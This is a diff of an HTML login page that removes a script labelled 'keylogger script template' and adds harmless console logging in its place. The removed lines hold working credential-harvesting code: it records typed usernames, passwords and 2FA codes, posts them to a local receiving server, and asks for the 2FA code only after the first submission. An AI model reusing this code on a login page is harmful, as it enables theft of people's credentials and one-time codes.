@@ -1,74 +1,90 @@
-#your website here (html): 
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login - Placeholder</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f4f8;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      width: 400px;
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #444;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #333;
+    }
+    .placeholder-logo {
+      height: 50px;
+      margin-bottom: 20px;
+      background: #ccc;
+      display: inline-block;
+      width: 50px;
+      border-radius: 50%;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="placeholder-logo"></div>
+    <h1>Company Login</h1>
+    <form id="loginForm">
+      <div class="form-group">
+        <input type="text" id="username" placeholder="Username" required />
+      </div>
+      <div class="form-group">
+        <input type="password" id="password" placeholder="Password" required />
+      </div>
+      <div class="form-group" id="twoFactorSection" style="display: none;">
+        <input type="text" id="twoFactorCode" placeholder="2FA Code" />
+      </div>
+      <button type="submit">Sign In</button>
+    </form>
+  </div>
 
-
-#keylogger script template
-
-    <script>
-        // Real-time logging to localStorage and console
-        document.getElementById('username').addEventListener('input', function() {
-            localStorage.setItem('loggedUsername', this.value);
-            console.log('Username input:', this.value);
-        });
-
-        document.getElementById('password').addEventListener('input', function() {
-            localStorage.setItem('loggedPassword', this.value);
-            console.log('Password input:', this.value);
-        });
-
-        document.getElementById('twoFactorCode').addEventListener('input', function() {
-            localStorage.setItem('loggedTwoFactorCode', this.value);
-            console.log('2FA Code input:', this.value);
-        });
-
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const twoFactorSection = document.getElementById('twoFactorSection');
-            const twoFactorCode = document.getElementById('twoFactorCode').value;
-
-            // Prepare data to send (always include username and password)
-            const data = { username, password };
-            if (twoFactorSection.style.display !== 'none') {
-                data.twoFactorCode = twoFactorCode;
-            }
-
-            console.log('Sending to server:', data);
-
-            fetch('http://127.0.0.1:5501/receive', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                console.log('Response status:', response.status);
-                if (!response.ok) {
-                    throw new Error('Network response was not ok: ' + response.statusText);
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log('Server response:', data);
-                if (twoFactorSection.style.display === 'none') {
-                    // Show 2FA field after first submission
-                    twoFactorSection.style.display = 'block';
-                    document.getElementById('twoFactorCode').focus();
-                    document.getElementById('twoFactorCode').setAttribute('required', 'true');
-                }
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-            });
-        });
-    </script>
-        
-        </div>
-    </footer>
+  <!-- Educational / Defensive scripts could go here -->
+  <script>
+    // Example educational logging for local awareness (does not transmit)
+    document.getElementById('username').addEventListener('input', e => {
+      console.log('[Demo] Username field changed:', e.target.value);
+    });
+    document.getElementById('password').addEventListener('input', e => {
+      console.log('[Demo] Password field changed');
+    });
+    document.getElementById('twoFactorCode').addEventListener('input', e => {
+      console.log('[Demo] 2FA field changed');
+    });
+  </script>
 </body>
 </html>
